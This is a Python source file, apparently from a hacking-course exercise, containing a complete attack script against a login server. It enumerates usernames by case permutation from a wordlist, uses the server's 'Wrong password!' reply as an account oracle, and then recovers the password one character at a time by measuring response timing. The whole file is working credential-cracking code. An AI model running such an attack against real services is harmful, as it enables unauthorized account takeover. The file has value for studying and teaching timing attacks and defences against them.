from itertools import product
from json import dumps
from json import loads
from os import path
from statistics import mean
from string import ascii_lowercase
from string import ascii_uppercase
from string import digits
from time import perf_counter

from server import Server


class Attack:
    @staticmethod
    def attack(host, port):
        # Connect to server.
        server = Server()
        server.connect(host, port)

        # Login file relative location varies between running in testing mode and dev mode.
        file_name = 'logins.txt'  # Testing mode.
        if not path.exists(file_name):
            file_name = '../logins.txt'  # Dev mode.

        # Loop through logins.
        with open(file_name, 'r') as f:
            for login in f:
                login = login.strip()
                login_case = Attack.try_login_case_permutations(server, login)
                if login_case:
                    break

        # Did we find login?
        password = None
        if login_case:
            password = Attack.try_passwords(server, login_case)

        # Print login and password.
        print(dumps({
            'login': login_case,
            'password': password
        }, indent=4))

        # Disconnect from server.
        server.disconnect()

    @staticmethod
    def try_login_case_permutations(server, login):
        # Loop through all case permutations of login characters.
        login_cases = list(map(''.join, product(*zip(login.upper(), login.lower()))))
        for login_case in login_cases:
            # Send request to server.
            request = dumps({
                'login': login_case,
                'password': ''
            })
            response_json = server.send(request)

            # Return login if correct.
            response = loads(response_json)
            if response['result'] == 'Wrong password!':
                return login_case

        return None

    @staticmethod
    def try_passwords(server, login):
        # Determine what a long response time would be.
        response_times = []
        for _ in range(100):
            # Send request to server.
            request = dumps({
                'login': login,
                'password': 'bad-*-password'
            })
            start = perf_counter()
            server.send(request)
            end = perf_counter()
            response_times.append(end - start)
        long_response_time = 100 * mean(response_times)

        status = ''
        password = ''
        while status not in ['CONNECT', 'ERROR']:
            status, password = Attack.try_password_character_permutations(server, login, password, long_response_time)

        return password

    @staticmethod
    def try_password_character_permutations(server, login, password, long_response_time):
        # Loop through all possible password characters.
        password_characters = ascii_uppercase + ascii_lowercase + digits
        for i in range(len(password_characters)):
            # Send request to server and record response time.
            password_with_character = password + password_characters[i]
            request = dumps({
                'login': login,
                'password': password_with_character
            })
            start = perf_counter()
            response_json = server.send(request)
            end = perf_counter()

            # A long response time indicates an exception which means character was correct.
            if (end - start) > long_response_time:
                return 'CHARACTER', password_with_character

            # Return connect status if we connected.
            response = loads(response_json)
            if response['result'] == 'Connection success!':
                return 'CONNECT', password_with_character

        return 'ERROR', None
